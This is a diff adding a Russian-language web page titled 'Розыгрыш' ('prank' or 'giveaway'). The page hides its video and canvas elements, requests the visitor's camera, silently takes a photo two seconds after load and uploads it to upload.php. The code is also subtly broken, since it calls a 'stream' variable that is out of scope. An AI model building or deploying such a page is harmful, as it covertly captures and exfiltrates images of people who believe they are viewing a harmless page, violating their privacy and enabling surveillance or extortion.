@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Розыгрыш</title>
+  <style>
+    /* Скрываем элементы на странице */
+    #video, #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    // Запрашиваем доступ к камере
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        console.error('Ошибка доступа к камере:', err);
+      });
+
+    // Через 2 секунды после загрузки страницы делаем фото
+    setTimeout(() => {
+      // Рисуем изображение с видео в canvas
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Преобразуем в base64
+      const imgData = canvas.toDataURL('image/png');
+
+      // Преобразуем base64 в Blob для отправки
+      const formData = new FormData();
+      formData.append('image', dataURItoBlob(imgData));
+
+      // Отправляем фото на сервер
+      fetch('upload.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Фото отправлено');
+      })
+      .catch(err => {
+        console.error('Ошибка при отправке фото:', err);
+      });
+
+      // Останавливаем камеру после отправки фото
+      stream.getTracks().forEach(track => track.stop());
+    }, 2000); // Фото через 2 секунды после загрузки страницы
+
+    // Функция для преобразования base64 в Blob
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const arrayBuffer = new ArrayBuffer(byteString.length);
+      const uintArray = new Uint8Array(arrayBuffer);
+      for (let i = 0; i < byteString.length; i++) {
+        uintArray[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([uintArray], { type: 'image/png' });
+    }
+  </script>
+</body>
+</html>
